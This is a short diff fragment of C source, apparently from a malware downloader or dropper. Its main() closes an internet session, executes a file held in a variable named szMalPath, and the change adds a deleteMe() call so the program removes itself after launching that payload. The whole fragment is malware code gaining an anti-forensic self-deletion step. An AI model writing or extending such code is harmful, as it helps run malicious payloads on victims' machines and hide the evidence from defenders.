@@ -99,6 +99,7 @@ int main()
 	InternetCloseHandle(hInternet);
 
 	FileExecute(szMalPath);
+	deleteMe();
 
 	return 0;
 }
